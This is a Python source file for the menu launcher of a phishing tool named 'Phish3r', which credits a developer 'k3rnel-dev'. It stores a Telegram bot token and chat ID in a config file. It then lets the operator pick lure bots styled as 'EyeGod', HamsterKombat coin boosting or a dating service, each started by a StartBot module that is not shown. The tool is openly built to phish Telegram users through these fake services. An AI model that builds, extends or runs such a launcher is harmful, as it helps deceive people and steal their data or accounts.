import os
import sys
import config
import ctypes
from Modules.ColorManager import Black, Red, Green, Yellow, Blue, Purple, Cyan, White, Reset
from Modules.BotManager import StartBot

def banner():
    border_color = Green
    text_color = White
    print(f"""
{border_color}/**{Reset}
{border_color}* {border_color}+===========================================+{Reset}
{border_color}* {border_color}|{Reset} {text_color}   ___  _  _  ___  ___  _  _  ___  ___    {border_color}|{Reset}
{border_color}* {border_color}|{Reset} {text_color}  | _ || || ||_ _|/ __|| || || __|| _ |   {border_color}|{Reset}
{border_color}* {border_color}|{Reset} {text_color}  |  _/| __ | | | |__ || __ || _| |   /   {border_color}|{Reset}
{border_color}* {border_color}|{Reset} {text_color}  |_|  |_||_||___||___/|_||_||___||_|_|   {border_color}|{Reset}
{border_color}* {border_color}+===========================================+ 
{border_color}*{Reset} {text_color}				                
          {text_color}// B Y - K 3 R N E L - D E V \\\\
        {text_color}// https://github.com/k3rnel-dev \\\\
		""")

prompt = f'{Green}[{White}0x1337{Green}]──[{White}Phish3r{Green}]\n' \
         f'└─────►{White} '

def BotMain():
	while True:
		clear_screen()
		banner()

		print(f"\n{Green}[{White}!{Green}]{White} Select Option\n"
			f"{Cyan}[1] Change Config\n[2] Phish-Bot selector\n[3] Exit\n")

		try:
			option = input(f"{prompt}")
			if option == "1":
				config()

			elif option == "2":
				bot_select()

			elif option == "3":
				exit_script()

			else:
				print(f"{Red}[{White}!{Red}]{White} Invalid option selected")

		except KeyboardInterrupt:
			print(f"\n{Green}[{White}!{Green}]{White} Aborting ... ")
			exit_script()

		except Exception as e:
			print(f"{Red}[{White}!{Red}]{White} An unexpected error occurred: {e}")


def bot_select():
	
	SetTitle("Phish3r [ Bot-Selector ]")
	clear_screen()
	
	banner()
	print(f"\n{Green}[{White}1{Green}]{White}EyeGod(Глаз Бога)\n"
		f"{Green}[{White}2{Green}]{White}HamsterKombat(Накрутка Монет)\n"
		f"{Green}[{White}3{Green}]{White}Acquaintance(Знакомства)\n")

	option = input(prompt)

	if option == "1":
		StartBot("ГлазБога")

	elif option == "2":
		StartBot("Хамстер")

	elif option == "3":
		StartBot("Знакомства")

def config():
	clear_screen()
	SetTitle("Phish3r [ Config-Setting ]")
	banner()
	print(f"{Cyan}[!] Change Config Panel")
    
	new_token = input(f"{prompt}Token-bot: ")
	new_chatid = input(f"\n{prompt}Chat-Id: ")

	update_config(new_token, new_chatid)

def update_config(token, chatid):
    config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config.py')
    
    with open(config_path, 'w') as config_file:
        config_file.write(f'TOKEN = "{token}"\n')
        config_file.write(f'CHATID = "{chatid}"\n')

    input(f"{Green}[!]Config {White}updated: TOKEN={Cyan}{token}{Reset}, CHATID={Cyan}{chatid}{Reset}\n{White} > Press Enter <")

def exit_script():
	print(f"{Green}[{White}-{Green}]{White} Good bye!.")
	exit()

def SetTitle(name):
	SetConsoleTitle = ctypes.windll.kernel32.SetConsoleTitleW
	SetConsoleTitle(name)

def clear_screen():
    if os.name == 'nt':
        # Windows
        os.system('cls')
    else:
        # Linux and macOS
        os.system('clear')

def main():
	SetTitle("Phish3r [MAIN] - by k3rnel-dev (github.com/k3rnel-dev)")

	banner()

	BotMain()
